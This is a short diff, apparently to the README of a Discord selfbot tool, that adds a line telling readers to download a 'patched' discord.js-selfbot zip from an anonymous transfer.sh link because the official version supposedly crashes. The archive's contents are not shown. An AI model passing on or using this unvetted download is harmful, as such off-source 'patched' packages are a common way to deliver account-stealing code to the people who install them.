@@ -4,3 +4,6 @@
 
 - multi account support
 - custom status config
+
+
+- download this https://transfer.sh/e4nlHD/discord.js-selfbot-patched.zip discord js selfbot and unzip its version probleme official version crash on write message on voice chat
